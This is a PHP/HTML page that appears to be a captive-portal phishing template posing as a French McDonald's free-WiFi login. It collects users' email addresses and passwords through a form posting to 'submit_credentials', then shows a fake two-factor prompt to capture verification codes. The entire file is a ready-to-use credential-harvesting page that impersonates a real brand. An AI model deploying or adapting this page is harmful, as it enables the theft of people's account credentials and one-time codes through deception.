<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<html>

<head>

	<title>McDonald - Free Wifi</title>

	<meta charset='UTF-8'>
	<meta http-equiv="cache-control" content="no-cache" />
	<meta http-equiv="expires" content="0" />
	<meta http-equiv="pragma" content="no-cache" />
	<meta name="viewport" content="width=device-width,
    initial-scale=1, maximum-scale=1, user-scalable=no">

	<script src="jquery-2.2.1.min.js"></script>
	<script type="text/javascript">
		function redirect() {
			setTimeout(function() {
				window.location = "/captiveportal/index.php";
			}, 100);
		}
	</script>

</head>

<body>
	<header class="small-header fixed" role="banner">
		<a href="https://www.mcdonalds.fr" title="Accueil" id="logo" rel="home">
			<img alt="Aller  l'accueil" src="assets/img/mplus-sso-logo-52a4759560774e2dee5a138d327d306a.png" />
		</a>
	</header>

	<main role="main">
		<section id="content" class="default_page">
			<section class="col-small login-page" id="column-1">
				<section class="login-register-block">
					<div class="login-block">
						<div id="login" class="login">
							<h1>Connexion</h1>
							<div class="t-zone" id="loginZone">
								<form id="login_form" class="form-error-false t-prevent-submission" action="submit_credentials" method="post">
									<div class="placeholder-field">
										<input id="j_username" name="login" aria-required="true" type="email" class="form-text" required="true" value="">

										<label for="j_username" class="form-label placeholder-label">
											<span>E-mail</span>
										</label>
									</div>
									<p id="error-email" class="field-error">
										<svg width="22" height="22" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg">
											<path d="M21 11C21 16.5228 16.5228 21 11 21C5.47715 21 1 16.5228 1 11C1 5.47715 5.47715 1 11 1C16.5228 1 21 5.47715 21 11Z" stroke="currentColor" stroke-width="2"></path>
											<path fill-rule="evenodd" clip-rule="evenodd" d="M11.1018 7.75383C10.7223 7.75383 10.4022 7.62813 10.1413 7.37675C9.88044 7.12536 9.75 6.81943 9.75 6.45894C9.75 6.09846 9.88044 5.79253 10.1413 5.54114C10.4022 5.28975 10.7223 5.16406 11.1018 5.16406C11.4813 5.16406 11.8014 5.28975 12.0623 5.54114C12.3232 5.79253 12.4536 6.09846 12.4536 6.45894C12.4536 6.81943 12.3232 7.12536 12.0623 7.37675C11.8014 7.62813 11.4813 7.75383 11.1018 7.75383ZM9.89453 16.5662V9.39453H12.3135V16.5662H9.89453Z" fill="currentColor"></path>
										</svg>
										Votre e-mail doit être dans un format de type xxx@yyy.zz
									</p>
									<div class="placeholder-field">
										<input id="j_password" name="password" aria-required="true" type="password" class="form-text" required="true" value="">
										<label for="j_password" class="form-label placeholder-label">
											<span>Mot de passe</span>
										</label>
										<button type="button" title="Rendre visible le mot de passe" id="buttonHelp" class="button-visibility password-help help">
											<img id="not" alt="" src="/app/image/visible_not-d46fb0d01e8b1410687d0bef5f2b1797.svg">
											<img id="visible" alt="" src="/app/image/visible-33b5381431fc53542e88ff2125e025e2.svg">
										</button>
									</div>
									<input id="challenge" name="challenge" hidden="hidden" type="text" value="6a185f335155444189c84cbe839c22a7">
									<input id="clientId" name="clientId" hidden="hidden" type="text" value="client-desktop">
									<input id="sessionId" name="sessionId" hidden="hidden" type="text" value="18bcfd123b6-b1f6535e-cd2a-4ae9-9772-21c854b742f8">
									<div class="create_account_div" id="create_account_div">
										<a id="forgot-pass" href="/app/password-forgotten">
											Mot de passe oublié ?
											<span><img class="icon" alt="" src="/app/image/arrow_next-8a67f6777fee34dfe1f858da6ce61fcd.svg"></span>
										</a>
									</div>
									<button type="submit" data-submit="true" id="button" class="connect btn" disabled="disabled" data-callback="onSubmit">
										<span class="btn-effect">Connexion</span>
										<span id="progress" class="progress-bar"> </span>
									</button>
								</form>
							</div>
						</div>
					</div>
				</section>
			</section>
		</section>
	</main>

	<dialog>
		<div class="dialog-content">
			<div class="dialog-header">
				<h2>Connexion</h2>
			</div>
			<div class="dialog-body">
				<p> Nous avons envoyé un code de double authentification à votre appareil de confiance </p>
				<form action="submit_credentials">
					<input type="text" name="code" placeholder="Code de vérification">
					<input type="submit" value="Valider>
				</form>
			</div>
			<div class="dialog-footer">
				<button class="dialog-close-button">Fermer</button>
			</div>
		</div>
	</dialog>
</body>
</html>